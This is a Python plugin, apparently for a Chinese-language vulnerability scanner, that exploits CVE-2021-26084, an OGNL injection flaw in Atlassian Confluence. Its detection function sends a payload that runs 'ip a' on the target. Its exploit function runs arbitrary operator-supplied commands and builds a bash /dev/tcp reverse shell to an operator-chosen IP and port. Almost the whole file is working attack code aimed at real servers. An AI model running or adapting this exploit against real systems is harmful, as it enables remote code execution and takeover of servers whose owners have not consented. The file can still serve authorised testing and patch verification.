import urllib.parse
import requests,base64
import re
requests.packages.urllib3.disable_warnings()
def vuln_info():
    info={
        'vuln_name': 'CVE-2021-26084',  #漏洞名称
        'vuln_referer':'无',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'Confluence',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''2021年08月26日，Atlassian官方发布了Confluence OGNL 注入漏洞的风险通告，漏洞编号为CVE-2021-26084，漏洞等级：严重，漏洞评分：8.8。目前该漏洞安全补丁已更新，漏洞细节未公开，POC（概念验证代码）未公开，在野利用未发现。''',
        'vuln_identifier':'''CVE-2021-26084''',
        'vuln_class':'远程命令执行',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''根据影响版本中的信息，排查并升级到安全版本，官方下载链接为：https://www.atlassian.com/software/confluence/download-archives''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/login.action', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="Confluence"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    # print(url)
    try:
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":""}
        vuln_url =url+"/pages/createpage-entervariables.action?SpaceKey=x"
        headers = {
        "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
        "Content-Type": "application/x-www-form-urlencoded"}
        params = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022ip a\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        r = requests.post(vuln_url, headers=headers, data=params,
                            timeout=10, verify=False)        
        if r.status_code==200 and 'inet' and 'inet6' in r.text:
            result['Result']= True
            result['Result_Info']= vuln_url
        else:
            result['Result_Info']= '不存在'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    
    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头 
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        vuln_url = url + "/pages/createpage-entervariables.action?SpaceKey=x"
        headers = {
        "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
        "Content-Type": "application/x-www-form-urlencoded"}

    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"不存在"}
        #命令执行
        if exp_data['type']=='cmd':
            command=exp_data['command']
            params = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + command + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
            res = requests.post(vuln_url, headers=headers, data=params,
                                timeout=10, verify=False).text
            pattern = re.compile(r'aaaaaaaa.*\]" ',re.S)
            result_data = pattern.findall(res)
            # print(result)
            # print(result[0])
            # result = re.match('aaaaaaaa\[.*', res)
            if result_data:
                data = str(result_data[0]).replace('aaaaaaaa[','').replace("]\"","").strip()          
                result['Result']= True
                result['Result_Info']= data
        
        #反弹shell    
        if exp_data['type']=='shell':
            command="bash%20-i%20>&%20/dev/tcp/"+exp_data['reverse_ip']+"/"+str(exp_data['reverse_port'])+"%200>&1"
            params = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + command + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
            res = requests.post(vuln_url, headers=headers, data=params,
                                timeout=10, verify=False).text
            pattern = re.compile(r'aaaaaaaa.*\]" ',re.S)
            result_data = pattern.findall(res)
            # print(result)
            # print(result[0])
            # result = re.match('aaaaaaaa\[.*', res)
            if result_data:
                data = str(result_data[0]).replace('aaaaaaaa[','').replace("]\"","").strip()          
                result['Result']= True
                result['Result_Info']= data
                
        #上传文件    
        if exp_data['type']=='uploadfile':
        
            result['Result']= True
            result['Result_Info']= "暂不支持文件上传"
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
